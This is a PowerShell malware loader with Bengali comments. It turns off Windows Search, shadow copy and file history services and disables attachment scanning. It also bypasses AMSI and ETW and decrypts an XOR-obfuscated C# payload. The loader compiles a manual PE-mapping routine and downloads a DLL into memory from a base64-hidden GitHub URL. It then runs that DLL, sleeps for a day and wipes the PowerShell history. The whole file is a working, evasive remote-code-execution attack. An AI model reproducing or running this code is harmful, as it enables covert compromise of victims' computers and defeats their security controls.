Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null

Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"

Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null

Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

# ================================================================
#  ★★★ ১. AMSI + ETW বাইপাস ★★★
# ================================================================
function Invoke-Bypass {
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    } catch {}
    try {
        $p = [System.Diagnostics.Process]::GetCurrentProcess()
        $h = $p.Handle
        $t = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.BaseAddress
        $v = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualProtect), [type])
        $old = 0
        $v.Invoke($t, 0x1000, 0x40, [ref]$old)
        [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)
        $v.Invoke($t, 0x1000, $old, [ref]$null)
    } catch {}
}

# ================================================================
#  ★★★ ২. XOR ডিক্রিপ্টর (স্ট্রং) ★★★
# ================================================================
function Xor-Decrypt {
    param([string]$Encoded, [byte]$Key = 0x5A)
    try {
        $bytes = [Convert]::FromBase64String($Encoded)
        for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $Key }
        # UTF8 এ কনভার্ট করার সময় অবৈধ সিকোয়েন্স থাকলে রিপ্লেস করো
        $result = [System.Text.Encoding]::UTF8.GetString($bytes)
        # অবৈধ ক্যারেক্টার বাদ দাও (যেমন \0, invalid surrogates)
        $result = [regex]::Replace($result, '\p{C}+', '')
        return $result
    } catch {
        return $null
    }
}

# ================================================================
#  ★★★ ৩. এনক্রিপ্টেড C# + প্লেইন C# (FALLBACK) ★★★
# ================================================================

# ---- এনক্রিপ্টেড C# স্ট্রিং (তোমার দেওয়া) ----
$encryptedCSharp = "LykzND16CSMpLj83YVAvKTM0PXoJIykuPzd0CC80LjM3P3QTNC4/KDUqCT8oLDM5PylhUC8pMzQ9egkjKS4/N3QOPyIuYVBQKi84NjM5ejk2Oykpehc7NC87Nhc7Kgg/KS82LnoheiovODYzOXoTNC4KLih6Ezc7PT8YOyk/YXoqLzg2Mzl6LzM0LnoTNzs9PwkzID9heiovODYzOXoTNC4KLih6HjY2FzszNBs+PihheiovODYzOXo2NTQ9eh4/Ni47YXoqLzg2Mzl6ODU1NnoTKWxuGDMuYXonUCovODYzOXopLjsuMzl6OTY7KSl6FDsuMyw/FjU7Pj8oeiFQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42Nnh2egk/LhY7KS4fKCg1KHpnei4oLz9zB3opLjsuMzl6PyIuPyg0ehM0LgouKHoMMyguLzs2GzY2NTlyEzQuCi4oejt2eg8TNC4KLih6KXZ6LzM0LnoudnovMzQueipzYVB6enp6AR42NhM3KjUoLnJ4MT8oND82aWh0PjY2eHZ6CT8uFjspLh8oKDUoemd6LigvP3MHeiovODYzOXopLjsuMzl6PyIuPyg0ejg1NTZ6DDMoLi87NhwoPz9yEzQuCi4oejt2eg8TNC4KLih6KXZ6LzM0Lnouc2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42Nnh2egk/LhY7KS4fKCg1KHpnei4oLz9zB3opLjsuMzl6PyIuPyg0ejg1NTZ6DDMoLi87NgooNS4/OS5yEzQuCi4oejt2eg8TNC4KLih6KXZ6LzM0Lnoqdno1Ly56LzM0Lno1c2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42Nnh2ehkyOygJPy56Z3oZMjsoCT8udBs0KTN2egk/LhY7KS4fKCg1KHpnei4oLz9zB3opLjsuMzl6PyIuPyg0ehM0LgouKHodPy4KKDU5Gz4+KD8pKXITNC4KLih6MnZ6KS4oMzQ9ejRzYVB6enp6AR42NhM3KjUoLnJ4MT8oND82aWh0PjY2eHZ6GTI7KAk/LnpnehkyOygJPy50GzQpM3Z6CT8uFjspLh8oKDUoemd6LigvP3MHeikuOy4zOXo/Ii4/KDR6EzQuCi4oeh0/LgooNTkbPj4oPykpchM0LgouKHoydnoTNC4KLih6NXNhUHp6enoBHjY2EzcqNSgucngxPyg0PzZpaHQ+NjZ4dnoZMjsoCT8uemd6GTI7KAk/LnQbNCkzdnoJPy4WOykuHygoNSh6Z3ouKC8/cwd6KS47LjM5ej8iLj8oNHoTNC4KLih6HT8uFzU+LzY/Ejs0PjY/G3IpLigzND16NHNhUHp6enoBHjY2EzcqNSgucngxPyg0PzZpaHQ+NjZ4dnoZMjsoCT8uemd6GTI7KAk/LnQbNCkzdnoJPy4WOykuHygoNSh6Z3ouKC8/cwd6KS47LjM5ej8iLj8oNHoTNC4KLih6FjU7PhYzOCg7KCMbcikuKDM0PXo0c2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42NnhzB3opLjsuMzl6PyIuPyg0ejg1NTZ6HDYvKTITNCkuKC85LjM1NBk7OTI/chM0LgouKHoydnoTNC4KLih6O3Z6DxM0LgouKHopc2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42NnhzB3opLjsuMzl6PyIuPyg0ehM0LgouKHodPy4ZLygoPzQuCig1OT8pKXJzYVB6enp6OTU0KS56LzM0LnoXGXpnemoia2pqanZ6Fwh6Z3pqImhqamp2ehccemd6aiJiampqdnoKCA16Z3pqImJudnoKHwh6Z3pqImhqdnoKHwgNemd6aiJuanZ6CggVemd6aiJqaGFQenp6eikuOy4zOXovKTI1KC56D2tscjgjLj8BB3o4dnozNC56NXN6IXooPy4vKDR6GDMuGTU0LD8oLj8odA41DxM0Lmtscjh2ejVzYXonUHp6enopLjsuMzl6LzM0Lnp6eg9paHI4Iy4/AQd6OHZ6MzQuejVzeiF6KD8uLyg0ehgzLhk1NCw/KC4/KHQONQ8TNC5paHI4dno1c2F6J1B6enp6KS47LjM5ei82NTQ9enoPbG5yOCMuPwEHejh2ejM0Lno1c3oheig/Li8oNHoYMy4ZNTQsPyguPyh0DjUPEzQubG5yOHZ6NXNheidQenp6eikuOy4zOXovMzQuenp6CA9paHITNC4KLih6KnZ6NjU0PXo1c3oheig/Li8oNHpyLzM0LnMXOygpMjs2dAg/Oz4TNC5paHJyEzQuCi4oc3IqdA41EzQubG5yc3E1c3NheidQenp6eikuOy4zOXovKTI1KC56CA9rbHITNC4KLih6KnZ6NjU0PXo1c3oheig/Li8oNHpyLykyNSgucxc7KCkyOzZ0CD87PhM0LmtscnITNC4KLihzcip0DjUTNC5sbnJzcTVzc2F6J1B6enp6KS47LjM5ei82NTQ9enoID2xuchM0LgouKHoqdno2NTQ9ejVzeiF6NjU0PXo2NXpnenI2NTQ9c3IvMzQucxc7KCkyOzZ0CD87PhM0LmlocnITNC4KLihzcip0DjUTNC5sbnJzcTVzc2F6NjU0PXoyM3pnenI2NTQ9c3IvMzQucxc7KCkyOzZ0CD87PhM0LmlocnITNC4KLihzcip0DjUTNC5sbnJzcTVxbnNzYXooPy4vKDR6ci82NTQ9c3JyMjNmZmlocyY2NXNheidQenp6eikuOy4zOXosNTM+eg0PbG5yEzQuCi4oeip2ejY1ND16NXZ6LzY1ND16LHN6IXoXOygpMjs2dA0oMy4/EzQubG5ychM0LgouKHNyKnQONRM0LmxucnNxNXN2cjY1ND1zLHNheidQenp6eikuOy4zOXosNTM+eg0PaWhyEzQuCi4oeip2ejY1ND16NXZ6LzM0Lnosc3p6eiF6FzsoKTI7NnQNKDMuPxM0LmlocnITNC4KLihzcip0DjUTNC5sbnJzcTVzdnIzNC5zLHNheidQenp6eikuOy4zOXopLigzND16CBspOTMzchM0LgouKHoqdno2NTQ9ejVzeiF6LDsoeik4emd6ND8tegkuKDM0PRgvMzY+Pyhyc2F6PDUoenIzNC56M2dqYTNmaGxqYTNxcXN6IXo4Iy4/ejhnFzsoKTI7NnQIPzs+GCMuP3JyEzQuCi4oc3IqdA41EzQubG5yc3E1cTNzc2F6MzxyOGdnanM4KD87MWF6KTh0GyoqPzQ+cnI5MjsoczhzYXoneig/Li8oNHopOHQONQkuKDM0PXJzYXonUHp6enopLjsuMzl6LzM0LnoJCig1LnIvMzQuejlzeiF6ODU1NnoiZ3I5fGoiaGpqampqampze2dqdnotZ3I5fGoiYmpqampqampze2dqdnooZ3I5fGoibmpqampqampze2dqYXozPHIifHwtc3ooPy4vKDR6Ch8IDWF6MzxyInx8KHN6KD8uLyg0egofCGF6MzxyInN6KD8uLyg0egofCGF6MzxyLXN6KD8uLyg0egoIDWF6KD8uLyg0egoIFWF6J1B6enp6KS4oLzkuegk/OXoheiovODYzOXovMzQuegwJdgwbdgkIHnYKCB52GTJheidQenp6egEPNDc7NDs9Pz4cLzQ5LjM1NAo1MzQuPyhyGTs2NjM0PRk1NCw/NC4zNTR0CS4+GTs2NnMHej4/Nj89Oy4/ejg1NTZ6HjY2FzszNBw0chM0LgouKHoydnovMzQueih2ehM0LgouKHoqc2FQenp6eiovODYzOXopLjsuMzl6Fzs0Lzs2FzsqCD8pLzYuehc7KnI4Iy4/AQd6PjY2dno4NTU2ejk7NjYfNC4oI3N6IVB6enp6enp6eiw7KHooPyl6Z3o0Py16Fzs0Lzs2FzsqCD8pLzYucnNhUHp6enp6enp6MzxyD2tscj42NnZqc3tnaiJvG24ec3ouMig1LXo0Py16HyI5PyouMzU0cngTNCw7NjM+ehcAeHNhUHp6enp6enp6MzQuejY8O3pnehgzLhk1NCw/KC4/KHQONRM0Lmlocj42NnZqImkZc2F6MzxyD2locj42NnY2PDtze2dqIm5vb2ovc3ouMig1LXo0Py16HyI5PyouMzU0cngTNCw7NjM+egofeHNhUHp6enp6enp6MzQuejk1ZzY8O3FuYXovKTI1KC56NClnD2tscj42NnY5NXFoc3Z6NTIpZw9rbHI+NjZ2OTVxa2xzYXozNC56NTVnOTVxaGphejg1NTZ6MylsbmdyD2tscj42NnY1NXNnZ2oiamhqGHNheig/KXQTKWxuGDMuZzMpbG5hUHp6enp6enp6LzM0Lno/KmcPaWhyPjY2djU1cWtsc3Z6KTUzZw9paHI+NjZ2NTVxb2xzdnopNTJnD2locj42NnY1NXFsanNhei82NTQ9ejM4ZzMpbG5lD2xucj42NnY1NXFobnNgD2locj42NnY1NXFoYnNheig/KXQTNzs9PwkzID9nKTUzYVB6enp6enp6ejM0Lno+PmczKWxuZTU1cWtraGA1NXFjbGF6LzM0LnozKCw7Zw9paHI+NjZ2Pj5xYnN2eigoLDtnD2locj42NnY+PnFuanN2eigpIGcPaWhyPjY2dj4+cW5uc2FQenp6enp6enozNC56KS5nNTVxNTIpYXosOyh6KT85KWc0Py16CT85ATQpB2F6PDUocjM0LnozZ2phM2Y0KWEzcXFzITM0Lno4ZykucTNwbmphKT85KQEzB2c0Py16CT85IQwJZw9paHI+NjZ2OHFic3YMG2cPaWhyPjY2djhxa2hzdgkIHmcPaWhyPjY2djhxa2xzdgoIHmcPaWhyPjY2djhxaGpzdhkyZw9paHI+NjZ2OHFpbHMnYSdQenp6enp6enoTNC4KLih6Mzc9ZwwzKC4vOzYbNjY1OXITNC4KLih0AD8oNXZyDxM0LgouKHMpNTN2FxkmFwh2CggNc2F6MzxyMzc9Z2cTNC4KLih0AD8oNXN6LjIoNS16ND8teh8iOT8qLjM1NHJ4DDMoLi87Nhs2NjU5ejw7MzY/PnhzYVB6enp6enp6eig/KXQTNzs9Pxg7KT9nMzc9YXo2NTQ9ejs4ZzM3PXQONRM0LmxucnN2ej4/Ni47Zzs4d3I2NTQ9czM4YXooPyl0Hj82LjtnPj82LjthUHp6enp6enp6FzsoKTI7NnQZNSojcj42NnZqdjM3PXZyMzQucyk1MnNhUHp6enp6enp6PDUoPzs5MnIsOyh6KXozNHopPzkpcyF6MzxyKXQJCB5nZ2pzejk1NC4zNC8/YXovMzQuejkpZyl0DAlnZ2plKXQJCB5gFzsuMnQXMzRyKXQJCB52KXQMCXNhejM8cil0CggecTkpZHIvMzQucz42NnQWPzQ9LjJzITkpZ3IvMzQucz42NnQWPzQ9LjJ3KXQKCB5hejM8cjkpZ2dqczk1NC4zNC8/YSd6FzsoKTI7NnQZNSojcj42NnZyMzQucyl0CggednITNC4KLihzcjs4cSl0DBtzdnIzNC5zOSlzYXonUHp6enp6enp6MzxyKCgsO3tnanx8Pj82Ljt7Z2pzIXovMzQueig1ZygoLDt2eig/ZygoLDtxKCkgYXotMjM2P3IoNWYoP3Mhei8zNC56Kj1nCA9paHIzNz12KDVzdno4KWcID2locjM3PXYoNXFuc2F6MzxyOClnZ2pzOCg/OzFhejM0Lno0P2dyMzQuc3I4KXdic3VoYXo8NShyMzQuejNnamEzZjQ/YTNxcXMhei8pMjUoLno/ZwgPa2xyMzc9dig1cWJxM3Boc2F6MzQuei4jZ3I/ZGRraHN8aiIcdno1PGc/fGoiHBwcYXozPHIuI2dnanM5NTQuMzQvP2F6NjU0PXouKGcqPXE1PGF6MzxyLiNnZ2tqcyEvNjU0PXo5ZwgPbG5yMzc9di4oc2END2xucjM3PXYuKHZyLzY1ND1zcnI2NTQ9czlxPj82Ljtzc2Enej82KT96MzxyLiNnZ2lzIS8zNC56OWcID2locjM3PXYuKHNhDQ9paHIzNz12Lih2ci8zNC5zcnI2NTQ9czlxPj82Ljtzc2Eneid6KDVxZzgpYXoneidQenp6enp6enozPHIzKCw7e2dqcyF6MzQuejM/Z2phei0yMzY/ci4oLz9zIXo2NTQ9ej81ZzMoLDtxMz9waGphei8zNC56NChnCA9paHIzNz12PzVxa2hzdjMoZwgPaWhyMzc9dj81cWtsc3YzNChnCA9paHIzNz12PzVzYXozPHI0KGdnanM4KD87MWF6KS4oMzQ9ej40ZwgbKTkzM3IzNz12NChzYXoTNC4KLih6Mj5nHT8uFzU+LzY/Ejs0PjY/G3I+NHNhejM8cjI+Z2cTNC4KLih0AD8oNXN6Mj5nFjU7PhYzOCg7KCMbcj40c2F6MzxyMj5nZxM0LgouKHQAPyg1cyEzP3FxYTk1NC4zNC8/YSd6NjU0PXouNWdqYXovMzQuei44ZzM0KHtnamUzNChgMyhhejM0LnouKWczKWxuZWJgbmF6LTIzNj9yLigvP3MhejY1ND16Lj9nLjhxLjVhejY1ND16LixnMylsbmVyNjU0PXMID2xucjM3PXYuP3NgcjY1ND1zCA9paHIzNz12Lj9zYXozPHIuLGdnanM4KD87MWF6NjU0PXo1PGczKWxuZS80OTI/OTE/PnJyNjU0PXNqImJqampqampqampqampqamoWc2ByNjU0PXNqImJqampqampqYXoTNC4KLih6PDtnEzQuCi4odAA/KDVhejM8cnIuLHw1PHN7Z2pzejw7Zx0/LgooNTkbPj4oPykpcjI+dnITNC4KLihzcjM0LnNyLix8aiIcHBwcc3Nhej82KT96PDtnHT8uCig1ORs+Pig/KSlyMj52CBspOTMzcjM3PXYuLHFoc3NhejM8cjw7e2cTNC4KLih0AD8oNXMhehM0LgouKHozO2dyEzQuCi4oc3I7OHEzKHEuNXNhejM8cjMpbG5zehc7KCkyOzZ0DSgzLj8TNC5sbnIzO3Y8O3QONRM0LmxucnNzYXo/Nik/ehc7KCkyOzZ0DSgzLj8TNC5paHIzO3Y8O3QONRM0LmlocnNzYXonei41cWcuKWF6J3ozP3FxYXoneidQenp6enp6eno8NSg/Ozkyciw7KHopejM0eik/OSlzIXovMzQueikgZxc7LjJ0Fzsicil0DAl2KXQJCB5zYXozPHIpIGdnanM5NTQuMzQvP2F6LzM0Lno1KmF6DDMoLi87NgooNS4/OS5ychM0LgouKHNyOzhxKXQMG3N2cg8TNC4KLihzKSB2CQooNS5yKXQZMnN2NS8uejUqc2F6J1B6enp6enp6ehw2LykyEzQpLigvOS4zNTQZOzkyP3IdPy4ZLygoPzQuCig1OT8pKXJzdjM3PXZyDxM0LgouKHMpNTNzYVB6enp6enp6eig/KXQeNjYXOzM0Gz4+KGcTNC4KLih0AD8oNWF6MzxyOTs2Nh80LigjfHw/KntnanMheig/KXQeNjYXOzM0Gz4+KGdyEzQuCi4oc3I7OHE/KnNhei4oIyEsOyh6PDRnch42Nhc7MzQcNHMXOygpMjs2dB0/Lh4/Nj89Oy4/HDUoHC80OS4zNTQKNTM0Lj8ocig/KXQeNjYXOzM0Gz4+KHYuIyo/NTxyHjY2FzszNBw0c3NhPDRyMzc9dmt2EzQuCi4odAA/KDVzYSd6OTsuOTIhJ3onUHp6enp6enp6KD8uLyg0eig/KWFQenp6eidQenp6eiovODYzOXopLjsuMzl6ODU1NnocKD8/chM0LgouKHo4c3oheig/Li8oNHoMMyguLzs2HCg/P3I4dg8TNC4KLih0AD8oNXYXHHNheidQJw=="

# ---- প্লেইন C# (FALLBACK - সব পিসিতে কাজ করে) ----
$plainCSharpFallback = @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class ManualMapResult { public IntPtr ImageBase; public uint ImageSize; public IntPtr DllMainAddr; public long Delta; public bool Is64Bit; }
public static class NativeLoader {
    [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool VirtualFree(IntPtr a, UIntPtr s, uint t);
    [DllImport("kernel32.dll", SetLastError = true)] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr h, IntPtr o);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetModuleHandleA(string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr LoadLibraryA(string n);
    [DllImport("kernel32.dll")] static extern bool FlushInstructionCache(IntPtr h, IntPtr a, UIntPtr s);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
    const uint MC = 0x1000, MR = 0x2000, MF = 0x8000, PRW = 0x04, PER = 0x20, PERW = 0x40, PRO = 0x02;
    static ushort U16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }
    static uint   U32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
    static ulong  U64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }
    static uint   RU32(IntPtr p, long o) { return (uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o)); }
    static ushort RU16(IntPtr p, long o) { return (ushort)Marshal.ReadInt16((IntPtr)(p.ToInt64()+o)); }
    static ulong  RU64(IntPtr p, long o) { long lo = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o)); long hi = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o+4)); return (ulong)((hi<<32)|lo); }
    static void WU64(IntPtr p, long o, ulong v) { Marshal.WriteInt64((IntPtr)(p.ToInt64()+o),(long)v); }
    static void WU32(IntPtr p, long o, uint v)   { Marshal.WriteInt32((IntPtr)(p.ToInt64()+o),(int)v); }
    static string RAscii(IntPtr p, long o) { var sb = new StringBuilder(); for (int i=0;i<260;i++) { byte b=Marshal.ReadByte((IntPtr)(p.ToInt64()+o+i)); if(b==0)break; sb.Append((char)b); } return sb.ToString(); }
    static uint SProt(uint c) { bool x=(c&0x20000000)!=0, w=(c&0x80000000)!=0, r=(c&0x40000000)!=0; if(x&&w) return PERW; if(x&&r) return PER; if(x) return PER; if(w) return PRW; return PRO; }
    struct Sec { public uint VS,VA,SRD,PRD,Ch; }
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool DllMainFn(IntPtr h, uint r, IntPtr p);
    public static ManualMapResult Map(byte[] dll, bool callEntry) {
        var res = new ManualMapResult();
        if(U16(dll,0)!=0x5A4D) throw new Exception("Invalid MZ");
        int lfa = BitConverter.ToInt32(dll,0x3C); if(U32(dll,lfa)!=0x4550u) throw new Exception("Invalid PE");
        int co=lfa+4; ushort ns=U16(dll,co+2), ohs=U16(dll,co+16); int oo=co+20; bool is64=(U16(dll,oo)==0x020B); res.Is64Bit=is64;
        uint ep=U32(dll,oo+16), soi=U32(dll,oo+56), soh=U32(dll,oo+60); ulong ib=is64?U64(dll,oo+24):U32(dll,oo+28); res.ImageSize=soi;
        int dd=is64?oo+112:oo+96; uint irva=U32(dll,dd+8), rrva=U32(dll,dd+40), rsz=U32(dll,dd+44);
        int st=oo+ohs; var secs=new Sec[ns]; for(int i=0;i<ns;i++){int b=st+i*40;secs[i]=new Sec{VS=U32(dll,b+8),VA=U32(dll,b+12),SRD=U32(dll,b+16),PRD=U32(dll,b+20),Ch=U32(dll,b+36)};}
        IntPtr img=VirtualAlloc(IntPtr.Zero,(UIntPtr)soi,MC|MR,PRW); if(img==IntPtr.Zero) throw new Exception("VirtualAlloc failed");
        res.ImageBase=img; long ab=img.ToInt64(), delta=ab-(long)ib; res.Delta=delta;
        Marshal.Copy(dll,0,img,(int)soh);
        foreach(var s in secs){ if(s.SRD==0) continue; uint cs=s.VS==0?s.SRD:Math.Min(s.SRD,s.VS); if(s.PRD+cs>(uint)dll.Length){cs=(uint)dll.Length-s.PRD; if(cs==0)continue;} Marshal.Copy(dll,(int)s.PRD,(IntPtr)(ab+s.VA),(int)cs); }
        if(rrva!=0&&delta!=0){ uint ro=rrva, re=rrva+rsz; while(ro<re){ uint pg=RU32(img,ro), bs=RU32(img,ro+4); if(bs==0)break; int ne=(int)(bs-8)/2; for(int i=0;i<ne;i++){ ushort e=RU16(img,ro+8+i*2); int ty=(e>>12)&0xF, of=e&0xFFF; if(ty==0)continue; long tr=pg+of; if(ty==10){ulong c=RU64(img,tr);WU64(img,tr,(ulong)((long)c+delta));} else if(ty==3){uint c=RU32(img,tr);WU32(img,tr,(uint)((long)c+delta));} } ro+=bs; } }
        if(irva!=0){ int ie=0; while(true){ long eo=irva+ie*20; uint nr=RU32(img,eo+12),ir=RU32(img,eo+16),inr=RU32(img,eo); if(nr==0)break; string dn=RAscii(img,nr); IntPtr hd=GetModuleHandleA(dn); if(hd==IntPtr.Zero) hd=LoadLibraryA(dn); if(hd==IntPtr.Zero){ie++;continue;} long to=0; uint tb=inr!=0?inr:ir; int ts=is64?8:4; while(true){ long te=tb+to; long tv=is64?(long)RU64(img,te):(long)RU32(img,te); if(tv==0)break; long of=is64?unchecked((long)0x8000000000000000L):(long)0x80000000; IntPtr fa=IntPtr.Zero; if((tv&of)!=0) fa=GetProcAddress(hd,(IntPtr)(int)(tv&0xFFFF)); else fa=GetProcAddress(hd,RAscii(img,tv+2)); if(fa!=IntPtr.Zero){ IntPtr ia=(IntPtr)(ab+ir+to); if(is64) Marshal.WriteInt64(ia,fa.ToInt64()); else Marshal.WriteInt32(ia,fa.ToInt32()); } to+=ts; } ie++; } }
        foreach(var s in secs){ uint sz=Math.Max(s.VS,s.SRD); if(sz==0)continue; uint op; VirtualProtect((IntPtr)(ab+s.VA),(UIntPtr)sz,SProt(s.Ch),out op); }
        FlushInstructionCache(GetCurrentProcess(),img,(UIntPtr)soi);
        res.DllMainAddr=IntPtr.Zero; if(callEntry&&ep!=0){ res.DllMainAddr=(IntPtr)(ab+ep); try{var fn=(DllMainFn)Marshal.GetDelegateForFunctionPointer(res.DllMainAddr,typeof(DllMainFn));fn(img,1,IntPtr.Zero);} catch{} }
        return res;
    }
    public static bool Free(IntPtr b) { return VirtualFree(b,UIntPtr.Zero,MF); }
}
"@

# ================================================================
#  ★★★ ৪. মূল স্ক্রিপ্ট – BYPASS + DECRYPT (with FALLBACK) + DOWNLOAD + MAP ★★★
# ================================================================

# ৪.১ – BYPASS কল করো
Invoke-Bypass

# ৪.২ – এনক্রিপ্টেড C# ডিক্রিপ্ট করার চেষ্টা করো
$plainCSharp = $null
$useEncrypted = $true

try {
    $plainCSharp = Xor-Decrypt $encryptedCSharp
    if (-not $plainCSharp -or $plainCSharp.Length -lt 500) {
        throw "Decrypted C# is empty or too short"
    }
    Write-Host "[+] Encrypted C# decrypted successfully." -ForegroundColor Green
} catch {
    Write-Host "[!] Decryption failed: $_" -ForegroundColor Yellow
    $useEncrypted = $false
}

# যদি এনক্রিপ্টেড ডিক্রিপ্ট না হয়, তাহলে প্লেইন C# ব্যবহার করো
if (-not $useEncrypted -or -not $plainCSharp) {
    Write-Host "[*] Using plain C# fallback (works on all PCs)" -ForegroundColor Yellow
    $plainCSharp = $plainCSharpFallback
}

# ৪.৩ – C# কোড কম্পাইল করো
try {
    Add-Type -TypeDefinition $plainCSharp -ErrorAction Stop
} catch {
    # যদি প্রথমবার ব্যর্থ হয়, তাহলে ফাইনাল চেষ্টা হিসেবে প্লেইন C# দিয়ে চেষ্টা করো
    Write-Host "[!] First compilation failed, trying fallback..." -ForegroundColor Yellow
    try {
        Add-Type -TypeDefinition $plainCSharpFallback -ErrorAction Stop
    } catch {
        Write-Host "[!] C# compilation failed permanently: $_" -ForegroundColor Red
        exit
    }
}

# ৪.৪ – URL টি Base64 এনকোডেড
$encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))

# ৪.৫ – DLL ডাউনলোড করো (মেমোরিতে)
try {
    $bytes = (New-Object System.Net.WebClient).DownloadData($url)
} catch {
    exit
}

# ৪.৬ – ম্যানুয়াল ম্যাপ করো
try {
    $result = [NativeLoader]::Map($bytes, $true)
} catch {
    exit
}

# ৪.৭ – ক্লিনআপ
$bytes = $null
$plainCSharp = $null
[GC]::Collect(); [GC]::WaitForPendingFinalizers()

# ৪.৮ – ২৪ ঘন্টা স্লিপ
Start-Sleep -Seconds 86400

# ৪.৯ – ক্লিনআপ (ঐচ্ছিক)
Clear-History
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
}
